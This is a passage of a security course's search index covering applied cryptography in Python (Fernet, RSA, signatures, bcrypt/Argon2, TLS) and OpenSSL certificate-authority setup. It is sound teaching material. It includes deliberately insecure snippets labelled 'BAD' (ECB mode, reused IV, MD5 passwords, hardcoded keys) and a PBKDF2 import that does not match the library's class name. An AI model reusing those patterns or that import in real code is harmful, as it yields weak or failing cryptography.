encrypted_message, 'signature': signature } def receive_message(self, package, sender_public_key_pem): \"\"\"Decrypt and verify message\"\"\" # Load sender's public key sender_public_key = serialization.load_pem_public_key( sender_public_key_pem ) # Verify signature try: sender_public_key.verify( package['signature'], package['encrypted_message'], padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(\"Signature verified!\") except: print(\"Invalid signature!\") return None # Decrypt symmetric key symmetric_key = self.private_key.decrypt( package['encrypted_key'], padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Decrypt message cipher = Fernet(symmetric_key) message = cipher.decrypt(package['encrypted_message']) return message.decode() # Usage alice = SecureMessaging() bob = SecureMessaging() # Alice sends message to Bob message = \"Hello Bob, this is secret!\" package = alice.send_message(message, bob.get_public_key()) # Bob receives message from Alice received = bob.receive_message(package, alice.get_public_key()) print(f\"Bob received: {received}\") SSL/TLS in Applications Secure HTTPS Client import requests # Verify SSL certificate (default) response = requests.get('https://example.com') # Custom certificate verification response = requests.get( 'https://example.com', verify='/path/to/ca-bundle.crt' ) # Disable verification (NOT RECOMMENDED in production) # response = requests.get('https://example.com', verify=False) # Client certificate authentication response = requests.get( 'https://example.com', cert=('/path/to/client.crt', '/path/to/client.key') ) Secure Websocket Server import ssl import asyncio import websockets async def secure_handler(websocket, path): \"\"\"Handle secure websocket connections\"\"\" try: async for message in websocket: response = f\"Echo: {message}\" await websocket.send(response) except websockets.exceptions.ConnectionClosed: pass # SSL context ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) ssl_context.load_cert_chain( certfile='/path/to/server.crt', keyfile='/path/to/server.key' ) # Start secure server start_server = websockets.serve( secure_handler, 'localhost', 8765, ssl=ssl_context ) asyncio.get_event_loop().run_until_complete(start_server) asyncio.get_event_loop().run_forever() Common Cryptography Mistakes \u274c Mistake 1: Using ECB Mode # BAD - ECB mode reveals patterns from Crypto.Cipher import AES cipher = AES.new(key, AES.MODE_ECB) # GOOD - Use GCM or CBC cipher = AES.new(key, AES.MODE_GCM) \u274c Mistake 2: Not Using IV/Nonce # BAD - Reusing same IV iv = b'1234567890123456' cipher = AES.new(key, AES.MODE_CBC, iv) # GOOD - Random IV each time import os iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) \u274c Mistake 3: Weak Random Numbers # BAD - Not cryptographically secure import random key = random.randint(0, 2**256) # GOOD - Cryptographically secure import secrets key = secrets.token_bytes(32) \u274c Mistake 4: Storing Keys in Code # BAD - Hardcoded key key = b'my_secret_key_123' # GOOD - Key from environment or key store import os key = os.environ.get('ENCRYPTION_KEY').encode() # Or from key management service # key = get_key_from_kms() \u274c Mistake 5: No Authentication # BAD - Encryption without authentication encrypted = cipher.encrypt(data) # GOOD - Authenticated encryption (GCM) cipher = AES.new(key, AES.MODE_GCM) ciphertext, tag = cipher.encrypt_and_digest(data) \u274c Mistake 6: Weak Hashing for Passwords # BAD - MD5 or SHA256 for passwords import hashlib hashed = hashlib.md5(password.encode()).hexdigest() # GOOD - bcrypt, scrypt, or Argon2 import bcrypt hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()) Key Storage and Management Environment Variables import os # Load key from environment encryption_key = os.environ.get('ENCRYPTION_KEY') if not encryption_key: raise ValueError(\"ENCRYPTION_KEY not set!\") # Set in shell export ENCRYPTION_KEY=\"your-key-here\" # Or in .env file (use python-dotenv) echo \"ENCRYPTION_KEY=your-key-here\" > .env Configuration Files import json def load_key_from_config(): \"\"\"Load key from encrypted config file\"\"\" with open('config.json.enc', 'rb') as f: encrypted_config = f.read() # Decrypt config with master key master_key = os.environ.get('MASTER_KEY') cipher = Fernet(master_key.encode()) decrypted = cipher.decrypt(encrypted_config) config = json.loads(decrypted) return config['encryption_key'] Hardware Security Modules (HSM) # Example using cloud HSM (AWS KMS) import boto3 def encrypt_with_kms(data, key_id): \"\"\"Encrypt data using AWS KMS\"\"\" kms = boto3.client('kms') response = kms.encrypt( KeyId=key_id, Plaintext=data ) return response['CiphertextBlob'] def decrypt_with_kms(ciphertext, key_id): \"\"\"Decrypt data using AWS KMS\"\"\" kms = boto3.client('kms') response = kms.decrypt( CiphertextBlob=ciphertext ) return response['Plaintext'] Practical Security Applications Encrypted Backup Script from cryptography.fernet import Fernet import os import tarfile from datetime import datetime def encrypted_backup(source_dir, backup_dir, key): \"\"\"Create encrypted backup of directory\"\"\" # Create tarball timestamp = datetime.now().strftime('%Y%m%d_%H%M%S') tarball_name = f'backup_{timestamp}.tar.gz' tarball_path = os.path.join('/tmp', tarball_name) with tarfile.open(tarball_path, 'w:gz') as tar: tar.add(source_dir, arcname=os.path.basename(source_dir)) # Encrypt tarball cipher = Fernet(key) with open(tarball_path, 'rb') as f: data = f.read() encrypted = cipher.encrypt(data) # Save encrypted backup encrypted_path = os.path.join(backup_dir, f'{tarball_name}.enc') with open(encrypted_path, 'wb') as f: f.write(encrypted) # Clean up unencrypted tarball os.remove(tarball_path) print(f\"Encrypted backup created: {encrypted_path}\") return encrypted_path # Usage key = Fernet.generate_key() encrypted_backup('/home/user/documents', '/backups', key) Secure Configuration Management import json from cryptography.fernet import Fernet class SecureConfig: def __init__(self, key): self.cipher = Fernet(key) self.config = {} def set(self, key, value): \"\"\"Set configuration value\"\"\" self.config[key] = value def get(self, key): \"\"\"Get configuration value\"\"\" return self.config.get(key) def save(self, filename): \"\"\"Save encrypted configuration\"\"\" json_data = json.dumps(self.config) encrypted = self.cipher.encrypt(json_data.encode()) with open(filename, 'wb') as f: f.write(encrypted) def load(self, filename): \"\"\"Load encrypted configuration\"\"\" with open(filename, 'rb') as f: encrypted = f.read() decrypted = self.cipher.decrypt(encrypted) self.config = json.loads(decrypted.decode()) # Usage key = Fernet.generate_key() config = SecureConfig(key) config.set('database_password', 'secret123') config.set('api_key', 'key_abc123') config.save('config.enc') # Load later new_config = SecureConfig(key) new_config.load('config.enc') print(new_config.get('database_password')) Key Takeaways Applied cryptography principles: - Use established libraries, not custom implementations - Always use authenticated encryption (GCM mode) - Generate keys securely (secrets module) - Store keys safely (environment variables, KMS) - Hash passwords with specialized algorithms (bcrypt, Argon2) Common patterns: - Hybrid encryption (RSA + AES) for large data - Digital signatures for authenticity - Key derivation from passwords (PBKDF2) - Perfect forward secrecy (ephemeral keys) Security checklist: - \u2713 Using secure random number generation - \u2713 Not hardcoding keys - \u2713 Using authenticated encryption - \u2713 Proper key management - \u2713 Regular key rotation - \u2713 Secure key transmission - \u2713 Protecting keys at rest Remember: - Cryptography is hard to get right - Use well-tested libraries - Don't roll your own crypto - Security through obscurity doesn't work - Always assume attackers know your algorithm Next, we'll explore PKI (Public Key Infrastructure) and certificate management in detail.","title":"Lesson 7.2"},{"location":"LECTURES/unit7/lesson7-2/#applied-cryptography-and-real-world-implementations","text":"Cryptography theory is one thing\u2014implementing it correctly is another. This lesson covers how to actually use cryptography in real applications, common pitfalls, and best practices for secure implementation.","title":"Applied Cryptography and Real-World Implementations"},{"location":"LECTURES/unit7/lesson7-2/#implementing-encryption-in-applications","text":"","title":"Implementing Encryption in Applications"},{"location":"LECTURES/unit7/lesson7-2/#python-cryptography","text":"Use the cryptography library\u2014don't roll your own crypto!","title":"Python Cryptography"},{"location":"LECTURES/unit7/lesson7-2/#symmetric-encryption-aes","text":"from cryptography.fernet import Fernet # Generate key key = Fernet.generate_key() print(f\"Key (save this securely): {key.decode()}\") # Create cipher object cipher = Fernet(key) # Encrypt plaintext = b\"Secret message\" ciphertext = cipher.encrypt(plaintext) print(f\"Encrypted: {ciphertext}\") # Decrypt decrypted = cipher.decrypt(ciphertext) print(f\"Decrypted: {decrypted.decode()}\") Fernet provides: - AES-128 encryption in CBC mode - HMAC for authentication - Timestamp for freshness - All-in-one authenticated encryption","title":"Symmetric Encryption (AES)"},{"location":"LECTURES/unit7/lesson7-2/#file-encryption","text":"from cryptography.fernet import Fernet import os def encrypt_file(filename, key): \"\"\"Encrypt a file\"\"\" cipher = Fernet(key) # Read file with open(filename, 'rb') as f: data = f.read() # Encrypt encrypted = cipher.encrypt(data) # Write encrypted file with open(filename + '.enc', 'wb') as f: f.write(encrypted) print(f\"Encrypted {filename} -> {filename}.enc\") def decrypt_file(filename, key): \"\"\"Decrypt a file\"\"\" cipher = Fernet(key) # Read encrypted file with open(filename, 'rb') as f: encrypted = f.read() # Decrypt try: decrypted = cipher.decrypt(encrypted) except: print(\"Decryption failed - wrong key or corrupted file\") return # Write decrypted file output = filename.replace('.enc', '.dec') with open(output, 'wb') as f: f.write(decrypted) print(f\"Decrypted {filename} -> {output}\") # Usage key = Fernet.generate_key() encrypt_file('secret.txt', key) decrypt_file('secret.txt.enc', key)","title":"File Encryption"},{"location":"LECTURES/unit7/lesson7-2/#password-based-encryption","text":"from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2 from cryptography.fernet import Fernet import base64 import os def derive_key_from_password(password, salt=None): \"\"\"Derive encryption key from password\"\"\" if salt is None: salt = os.urandom(16) kdf = PBKDF2( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, ) key = base64.urlsafe_b64encode(kdf.derive(password.encode())) return key, salt def encrypt_with_password(data, password): \"\"\"Encrypt data with password\"\"\" key, salt = derive_key_from_password(password) cipher = Fernet(key) encrypted = cipher.encrypt(data.encode()) # Return salt + encrypted data return salt + encrypted def decrypt_with_password(encrypted_data, password): \"\"\"Decrypt data with password\"\"\" # Extract salt and encrypted data salt = encrypted_data[:16] encrypted = encrypted_data[16:] # Derive key from password and salt key, _ = derive_key_from_password(password, salt) cipher = Fernet(key) # Decrypt decrypted = cipher.decrypt(encrypted) return decrypted.decode() # Usage password = \"my_secure_password\" data = \"Secret information\" encrypted = encrypt_with_password(data, password) print(f\"Encrypted: {encrypted.hex()}\") decrypted = decrypt_with_password(encrypted, password) print(f\"Decrypted: {decrypted}\")","title":"Password-Based Encryption"},{"location":"LECTURES/unit7/lesson7-2/#asymmetric-encryption-rsa","text":"from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes, serialization # Generate RSA key pair private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) public_key = private_key.public_key() # Save private key pem_private = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.BestAvailableEncryption(b'password') ) with open('private_key.pem', 'wb') as f: f.write(pem_private) # Save public key pem_public = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) with open('public_key.pem', 'wb') as f: f.write(pem_public) # Encrypt with public key message = b\"Secret message\" ciphertext = public_key.encrypt( message, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Decrypt with private key plaintext = private_key.decrypt( ciphertext, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) print(f\"Decrypted: {plaintext.decode()}\") Note: RSA encryption is limited by key size: - 2048-bit key can encrypt ~245 bytes - For larger data, encrypt a symmetric key with RSA - Then encrypt data with symmetric key (hybrid encryption)","title":"Asymmetric Encryption (RSA)"},{"location":"LECTURES/unit7/lesson7-2/#digital-signatures","text":"from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes # Generate key pair private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) public_key = private_key.public_key() # Sign a message message = b\"I agree to the terms\" signature = private_key.sign( message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(f\"Signature: {signature.hex()}\") # Verify signature try: public_key.verify( signature, message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(\"Signature valid!\") except: print(\"Signature invalid!\")","title":"Digital Signatures"},{"location":"LECTURES/unit7/lesson7-2/#password-storage","text":"NEVER store passwords in plaintext!","title":"Password Storage"},{"location":"LECTURES/unit7/lesson7-2/#hashing-passwords","text":"import bcrypt def hash_password(password): \"\"\"Hash password with bcrypt\"\"\" # Generate salt and hash salt = bcrypt.gensalt(rounds=12) # Work factor: 2^12 iterations hashed = bcrypt.hashpw(password.encode(), salt) return hashed def verify_password(password, hashed): \"\"\"Verify password against hash\"\"\" return bcrypt.checkpw(password.encode(), hashed) # Registration password = \"user_password123\" stored_hash = hash_password(password) print(f\"Stored hash: {stored_hash}\") # Login login_password = \"user_password123\" if verify_password(login_password, stored_hash): print(\"Login successful!\") else: print(\"Invalid password\")","title":"Hashing Passwords"},{"location":"LECTURES/unit7/lesson7-2/#using-argon2-more-secure","text":"from argon2 import PasswordHasher ph = PasswordHasher() def hash_password_argon2(password): \"\"\"Hash password with Argon2\"\"\" return ph.hash(password) def verify_password_argon2(password, hashed): \"\"\"Verify password against Argon2 hash\"\"\" try: ph.verify(hashed, password) return True except: return False # Usage password = \"secure_password\" hashed = hash_password_argon2(password) print(f\"Argon2 hash: {hashed}\") # Verification if verify_password_argon2(\"secure_password\", hashed): print(\"Password correct!\")","title":"Using Argon2 (More Secure)"},{"location":"LECTURES/unit7/lesson7-2/#secure-communication","text":"","title":"Secure Communication"},{"location":"LECTURES/unit7/lesson7-2/#creating-a-secure-messaging-system","text":"from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes, serialization from cryptography.fernet import Fernet class SecureMessaging: def __init__(self): # Generate RSA key pair self.private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) self.public_key = self.private_key.public_key() def get_public_key(self): \"\"\"Export public key for sharing\"\"\" return self.public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) def send_message(self, message, recipient_public_key_pem): \"\"\"Encrypt message for recipient\"\"\" # Generate random symmetric key symmetric_key = Fernet.generate_key() cipher = Fernet(symmetric_key) # Encrypt message with symmetric key encrypted_message = cipher.encrypt(message.encode()) # Load recipient's public key recipient_public_key = serialization.load_pem_public_key( recipient_public_key_pem ) # Encrypt symmetric key with recipient's public key encrypted_key = recipient_public_key.encrypt( symmetric_key, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Sign message signature = self.private_key.sign( encrypted_message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) return { 'encrypted_key': encrypted_key, 'encrypted_message': encrypted_message, 'signature': signature } def receive_message(self, package, sender_public_key_pem): \"\"\"Decrypt and verify message\"\"\" # Load sender's public key sender_public_key = serialization.load_pem_public_key( sender_public_key_pem ) # Verify signature try: sender_public_key.verify( package['signature'], package['encrypted_message'], padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(\"Signature verified!\") except: print(\"Invalid signature!\") return None # Decrypt symmetric key symmetric_key = self.private_key.decrypt( package['encrypted_key'], padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Decrypt message cipher = Fernet(symmetric_key) message = cipher.decrypt(package['encrypted_message']) return message.decode() # Usage alice = SecureMessaging() bob = SecureMessaging() # Alice sends message to Bob message = \"Hello Bob, this is secret!\" package = alice.send_message(message, bob.get_public_key()) # Bob receives message from Alice received = bob.receive_message(package, alice.get_public_key()) print(f\"Bob received: {received}\")","title":"Creating a Secure Messaging System"},{"location":"LECTURES/unit7/lesson7-2/#ssltls-in-applications","text":"","title":"SSL/TLS in Applications"},{"location":"LECTURES/unit7/lesson7-2/#secure-https-client","text":"import requests # Verify SSL certificate (default) response = requests.get('https://example.com') # Custom certificate verification response = requests.get( 'https://example.com', verify='/path/to/ca-bundle.crt' ) # Disable verification (NOT RECOMMENDED in production) # response = requests.get('https://example.com', verify=False) # Client certificate authentication response = requests.get( 'https://example.com', cert=('/path/to/client.crt', '/path/to/client.key') )","title":"Secure HTTPS Client"},{"location":"LECTURES/unit7/lesson7-2/#secure-websocket-server","text":"import ssl import asyncio import websockets async def secure_handler(websocket, path): \"\"\"Handle secure websocket connections\"\"\" try: async for message in websocket: response = f\"Echo: {message}\" await websocket.send(response) except websockets.exceptions.ConnectionClosed: pass # SSL context ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) ssl_context.load_cert_chain( certfile='/path/to/server.crt', keyfile='/path/to/server.key' ) # Start secure server start_server = websockets.serve( secure_handler, 'localhost', 8765, ssl=ssl_context ) asyncio.get_event_loop().run_until_complete(start_server) asyncio.get_event_loop().run_forever()","title":"Secure Websocket Server"},{"location":"LECTURES/unit7/lesson7-2/#common-cryptography-mistakes","text":"","title":"Common Cryptography Mistakes"},{"location":"LECTURES/unit7/lesson7-2/#mistake-1-using-ecb-mode","text":"# BAD - ECB mode reveals patterns from Crypto.Cipher import AES cipher = AES.new(key, AES.MODE_ECB) # GOOD - Use GCM or CBC cipher = AES.new(key, AES.MODE_GCM)","title":"\u274c Mistake 1: Using ECB Mode"},{"location":"LECTURES/unit7/lesson7-2/#mistake-2-not-using-ivnonce","text":"# BAD - Reusing same IV iv = b'1234567890123456' cipher = AES.new(key, AES.MODE_CBC, iv) # GOOD - Random IV each time import os iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv)","title":"\u274c Mistake 2: Not Using IV/Nonce"},{"location":"LECTURES/unit7/lesson7-2/#mistake-3-weak-random-numbers","text":"# BAD - Not cryptographically secure import random key = random.randint(0, 2**256) # GOOD - Cryptographically secure import secrets key = secrets.token_bytes(32)","title":"\u274c Mistake 3: Weak Random Numbers"},{"location":"LECTURES/unit7/lesson7-2/#mistake-4-storing-keys-in-code","text":"# BAD - Hardcoded key key = b'my_secret_key_123' # GOOD - Key from environment or key store import os key = os.environ.get('ENCRYPTION_KEY').encode() # Or from key management service # key = get_key_from_kms()","title":"\u274c Mistake 4: Storing Keys in Code"},{"location":"LECTURES/unit7/lesson7-2/#mistake-5-no-authentication","text":"# BAD - Encryption without authentication encrypted = cipher.encrypt(data) # GOOD - Authenticated encryption (GCM) cipher = AES.new(key, AES.MODE_GCM) ciphertext, tag = cipher.encrypt_and_digest(data)","title":"\u274c Mistake 5: No Authentication"},{"location":"LECTURES/unit7/lesson7-2/#mistake-6-weak-hashing-for-passwords","text":"# BAD - MD5 or SHA256 for passwords import hashlib hashed = hashlib.md5(password.encode()).hexdigest() # GOOD - bcrypt, scrypt, or Argon2 import bcrypt hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())","title":"\u274c Mistake 6: Weak Hashing for Passwords"},{"location":"LECTURES/unit7/lesson7-2/#key-storage-and-management","text":"","title":"Key Storage and Management"},{"location":"LECTURES/unit7/lesson7-2/#environment-variables","text":"import os # Load key from environment encryption_key = os.environ.get('ENCRYPTION_KEY') if not encryption_key: raise ValueError(\"ENCRYPTION_KEY not set!\") # Set in shell export ENCRYPTION_KEY=\"your-key-here\" # Or in .env file (use python-dotenv) echo \"ENCRYPTION_KEY=your-key-here\" > .env","title":"Environment Variables"},{"location":"LECTURES/unit7/lesson7-2/#configuration-files","text":"import json def load_key_from_config(): \"\"\"Load key from encrypted config file\"\"\" with open('config.json.enc', 'rb') as f: encrypted_config = f.read() # Decrypt config with master key master_key = os.environ.get('MASTER_KEY') cipher = Fernet(master_key.encode()) decrypted = cipher.decrypt(encrypted_config) config = json.loads(decrypted) return config['encryption_key']","title":"Configuration Files"},{"location":"LECTURES/unit7/lesson7-2/#hardware-security-modules-hsm","text":"# Example using cloud HSM (AWS KMS) import boto3 def encrypt_with_kms(data, key_id): \"\"\"Encrypt data using AWS KMS\"\"\" kms = boto3.client('kms') response = kms.encrypt( KeyId=key_id, Plaintext=data ) return response['CiphertextBlob'] def decrypt_with_kms(ciphertext, key_id): \"\"\"Decrypt data using AWS KMS\"\"\" kms = boto3.client('kms') response = kms.decrypt( CiphertextBlob=ciphertext ) return response['Plaintext']","title":"Hardware Security Modules (HSM)"},{"location":"LECTURES/unit7/lesson7-2/#practical-security-applications","text":"","title":"Practical Security Applications"},{"location":"LECTURES/unit7/lesson7-2/#encrypted-backup-script","text":"from cryptography.fernet import Fernet import os import tarfile from datetime import datetime def encrypted_backup(source_dir, backup_dir, key): \"\"\"Create encrypted backup of directory\"\"\" # Create tarball timestamp = datetime.now().strftime('%Y%m%d_%H%M%S') tarball_name = f'backup_{timestamp}.tar.gz' tarball_path = os.path.join('/tmp', tarball_name) with tarfile.open(tarball_path, 'w:gz') as tar: tar.add(source_dir, arcname=os.path.basename(source_dir)) # Encrypt tarball cipher = Fernet(key) with open(tarball_path, 'rb') as f: data = f.read() encrypted = cipher.encrypt(data) # Save encrypted backup encrypted_path = os.path.join(backup_dir, f'{tarball_name}.enc') with open(encrypted_path, 'wb') as f: f.write(encrypted) # Clean up unencrypted tarball os.remove(tarball_path) print(f\"Encrypted backup created: {encrypted_path}\") return encrypted_path # Usage key = Fernet.generate_key() encrypted_backup('/home/user/documents', '/backups', key)","title":"Encrypted Backup Script"},{"location":"LECTURES/unit7/lesson7-2/#secure-configuration-management","text":"import json from cryptography.fernet import Fernet class SecureConfig: def __init__(self, key): self.cipher = Fernet(key) self.config = {} def set(self, key, value): \"\"\"Set configuration value\"\"\" self.config[key] = value def get(self, key): \"\"\"Get configuration value\"\"\" return self.config.get(key) def save(self, filename): \"\"\"Save encrypted configuration\"\"\" json_data = json.dumps(self.config) encrypted = self.cipher.encrypt(json_data.encode()) with open(filename, 'wb') as f: f.write(encrypted) def load(self, filename): \"\"\"Load encrypted configuration\"\"\" with open(filename, 'rb') as f: encrypted = f.read() decrypted = self.cipher.decrypt(encrypted) self.config = json.loads(decrypted.decode()) # Usage key = Fernet.generate_key() config = SecureConfig(key) config.set('database_password', 'secret123') config.set('api_key', 'key_abc123') config.save('config.enc') # Load later new_config = SecureConfig(key) new_config.load('config.enc') print(new_config.get('database_password'))","title":"Secure Configuration Management"},{"location":"LECTURES/unit7/lesson7-2/#key-takeaways","text":"Applied cryptography principles: - Use established libraries, not custom implementations - Always use authenticated encryption (GCM mode) - Generate keys securely (secrets module) - Store keys safely (environment variables, KMS) - Hash passwords with specialized algorithms (bcrypt, Argon2) Common patterns: - Hybrid encryption (RSA + AES) for large data - Digital signatures for authenticity - Key derivation from passwords (PBKDF2) - Perfect forward secrecy (ephemeral keys) Security checklist: - \u2713 Using secure random number generation - \u2713 Not hardcoding keys - \u2713 Using authenticated encryption - \u2713 Proper key management - \u2713 Regular key rotation - \u2713 Secure key transmission - \u2713 Protecting keys at rest Remember: - Cryptography is hard to get right - Use well-tested libraries - Don't roll your own crypto - Security through obscurity doesn't work - Always assume attackers know your algorithm Next, we'll explore PKI (Public Key Infrastructure) and certificate management in detail.","title":"Key Takeaways"},{"location":"LECTURES/unit7/lesson7-3/","text":"PKI and Certificate Management Public Key Infrastructure (PKI) is the framework that enables secure communication across untrusted networks. Understanding PKI is essential for implementing HTTPS, email security, code signing, and authentication systems. Understanding PKI Components Core Components Certificate Authority (CA): - Issues and signs digital certificates - Verifies identity before issuing - Maintains certificate revocation lists - Root of trust in PKI hierarchy Registration Authority (RA): - Verifies certificate requests - Intermediary between users and CA - Performs identity verification - Approves or rejects requests Certificate: - Digital document binding public key to identity - Signed by CA - Contains subject information, validity period, public key Certificate Revocation List (CRL): - List of revoked certificates - Published by CA - Checked during certificate validation OCSP (Online Certificate Status Protocol): - Real-time certificate status checking - Alternative to CRL - More efficient for validation X.509 Certificates Certificate Structure Standard fields: Version: v3 Serial Number: unique identifier Signature Algorithm: RSA-SHA256 Issuer: CN=Example CA Validity: Not Before: 2024-01-01 Not After: 2025-01-01 Subject: CN=example.com Subject Public Key Info: Algorithm: RSA 2048 bit Public Key: ... Extensions: Subject Alternative Name: DNS:www.example.com Key Usage: Digital Signature, Key Encipherment Extended Key Usage: TLS Web Server Authentication Signature: ... Important fields: Common Name (CN): Primary identifier (domain name) Subject Alternative Names (SANs): Additional identifiers Key Usage: What the key can be used for Extended Key Usage: Specific purposes (web server, code signing) Authority Key Identifier: Links to issuing CA Subject Key Identifier: Unique key identifier Reading Certificates # View certificate details openssl x509 -in certificate.crt -text -noout # Check certificate dates openssl x509 -in certificate.crt -dates -noout # View certificate subject openssl x509 -in certificate.crt -subject -noout # View certificate issuer openssl x509 -in certificate.crt -issuer -noout # Check certificate fingerprint openssl x509 -in certificate.crt -fingerprint -noout Creating a Certificate Authority Root CA Setup # Create directory structure mkdir -p ca/{root-ca,intermediate-ca}/{private,certs,newcerts,crl,csr} cd ca/root-ca # Generate root CA private key openssl genrsa -aes256 -out private/ca.key.pem 4096 chmod 400 private/ca.key.pem # Create root CA certificate openssl req -config openssl.cnf \\ -key private/ca.key.pem \\ -new -x509 -days 7300 -sha256 -extensions v3_ca \\ -out certs/ca.cert.pem # Verify root certificate openssl x509 -noout -text -in certs/ca.cert.pem Root CA OpenSSL Configuration # /root-ca/openssl.cnf [ ca ] default_ca = CA_default [ CA_default ] dir = /path/to/ca/root-ca certs = $dir/certs crl_dir = $dir/crl new_certs_dir = $dir/newcerts database = $dir/index.txt serial = $dir/serial RANDFILE = $dir/private/.rand private_key = $dir/private/ca.key.pem certificate = $dir/certs/ca.cert.pem crlnumber = $dir/crlnumber crl = $dir/crl/ca.crl.pem crl_extensions = crl_ext default_crl_days = 30 default_md = sha256 name_opt = ca_default cert_opt = ca_default default_days = 375 preserve = no policy = policy_strict [ policy_strict ] countryName = match stateOrProvinceName = match organizationName = match organizationalUnitName = optional commonName = supplied emailAddress = optional [ v3_ca ] subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always,issuer basicConstraints = critical, CA:true keyUsage = critical, digitalSignature, cRLSign, keyCertSign Intermediate CA Setup cd /path/to/ca/intermediate-ca # Generate intermediate key openssl genrsa -aes256 -out private/intermediate.key.pem 4096 chmod 400 private/intermediate.key.pem # Create intermediate CSR openssl req -config openssl.cnf -new -sha256 \\ -key private/intermediate.key.pem \\ -out csr/intermediate.csr.pem # Sign intermediate certificate with root CA cd ../root-ca openssl ca -config openssl.cnf -extensions v3_intermediate_ca \\ -days 3650 -notext -md sha256 \\ -in ../intermediate-ca/csr/intermediate.csr.pem \\ -out ../intermediate-ca/certs/intermediate.cert.pem # Verify intermediate certificate openssl verify -CAfile certs/ca.cert.pem \\ ../intermediate-ca/certs/intermediate.cert.pem # Create certificate chain file cat ../intermediate-ca/certs/intermediate.cert.pem \\ certs/ca.cert.pem > ../intermediate-ca/certs/ca-chain.cert.pem Issuing Server Certificates Generate Server Certificate cd /path/to/ca/intermediate-ca # Generate server private key openssl genrsa -out private/server.key.pem 2048 chmod 400 private/server.key.pem # Create certificate signing request openssl req -config openssl.cnf \\ -key private/server.key.pem \\ -new -sha256 -out csr/server.csr.pem # Sign server certificate openssl ca -config openssl.cnf \\ -extensions server_cert -days 375 -notext -md sha256 \\ -in csr/server.csr.pem \\ -out certs/server.cert.pem # Verify server certificate openssl verify -CAfile certs/ca-chain.cert.pem \\ certs/server.cert.pem Server Certificate with SAN # Create config with Subject Alternative Names cat > server.cnf << EOF [req] distinguished_name = req_distinguished_name req_extensions = v3_req [req_distinguished_name] CN = example.com [v3_req] subjectAltName = @alt_names [alt_names] DNS.1 = example.com DNS.2 = www.example.com DNS.3 = api.example.com IP.1 = 192.168.1.100 EOF # Generate CSR with SANs openssl req -new -key server.key.pem \\ -out server.csr.pem \\ -config server.cnf # Sign with SANs openssl x509 -req -in server.csr.pem \\ -CA ca-chain.cert.pem -CAkey ca.key.pem \\ -CAcreateserial -out server.cert.pem \\ -days 365 -sha256 \\ -extfile server.cnf -extensions v3_req Client Certificates Generate Client Certificate # Generate client private key openssl genrsa -out client.key.pem 2048 # Create client CSR openssl req -new -key client.key.pem \\ -out client.csr.pem \\ -subj \"/C=US/ST=State/O=Org/CN=user@example.com\" # Sign client certificate openssl ca -config openssl.cnf \\ -extensions usr_cert -days 375 -notext -md sha256 \\ -in client.csr.pem \\ -out client.cert.pem # Create PKCS12 file for client openssl pkcs12 -export \\ -out client.p12 \\ -inkey client.key.pem \\ -in client.cert.pem \\ -certfile ca-chain.cert.pem Using Client Certificates Apache configuration: SSLVerifyClient require SSLVerifyDepth 2 SSLCACertificateFile /path/to/ca-chain.cert.pem Nginx configuration: ssl_client_certificate /path/to/ca-chain.cert.pem; ssl_verify_client on; ssl_verify_depth 2; Python requests: import requests response = requests.get( 'https://example.com', cert=('client.cert.pem', 'client.key.pem'), verify='ca-chain.cert.pem' ) Certificate Revocation Creating CRL # Revoke certificate openssl ca -config openssl.cnf \\ -revoke certs/server.cert.pem # Generate CRL openssl ca -config openssl.cnf \\ -gencrl -out crl/ca.crl.pem # View CRL openssl crl -in crl/ca.crl.pem -noout -text OCSP Responder # Start OCSP responder openssl ocsp -port 8080 \\ -index index.txt \\ -CA certs/ca-chain.cert.pem \\ -rkey private/ca.key.pem \\ -rsigner certs/ca.cert.pem # Check certificate status openssl ocsp -CAfile certs/ca-chain.cert.pem \\ -url http://localhost:8080 \\ -resp_text \\ -issuer certs/intermediate.cert.pem \\ -cert certs/server.cert.pem Let's Encrypt (Free Certificates) Certbot Installation # Install certbot sudo apt install certbot python3-certbot-apache # Or for nginx sudo apt install certbot python3-certbot-nginx Obtaining Certificates # Apache sudo certbot --apache -d example.com -d www.example.com # Nginx sudo certbot --nginx -d example.com -d www.example.com # Standalone (no web server) sudo certbot certonly --standalone -d example.com # DNS challenge (for wildcard) sudo certbot certonly --manual --preferred-challenges dns \\ -d example.com -d 